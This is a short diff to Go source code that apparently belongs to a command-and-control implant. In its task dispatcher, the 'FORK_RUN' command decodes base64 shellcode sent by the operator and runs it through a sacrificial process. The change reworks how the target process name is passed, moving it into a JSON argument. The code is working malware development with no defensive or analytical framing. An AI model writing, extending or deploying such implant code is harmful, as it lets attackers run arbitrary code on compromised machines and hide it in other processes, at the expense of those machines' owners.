@@ -953,13 +953,17 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, out, errStr)
 
 	case "FORK_RUN":
-		// Args: process path (optional). Payload: shellcode
+		// Args JSON: {"cmd":"<sacrificial_process>"} (optional). Payload: shellcode.
 		sc, err := base64.StdEncoding.DecodeString(task.Payload)
 		if err != nil {
 			t.sendResult(task.ID, "", "decode: "+err.Error())
 			return
 		}
-		out, err := forkRun(sc, strings.TrimSpace(task.Args))
+		var fa struct {
+			Cmd string `json:"cmd"`
+		}
+		_ = json.Unmarshal([]byte(task.Args), &fa)
+		out, err := forkRun(sc, strings.TrimSpace(fa.Cmd))
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
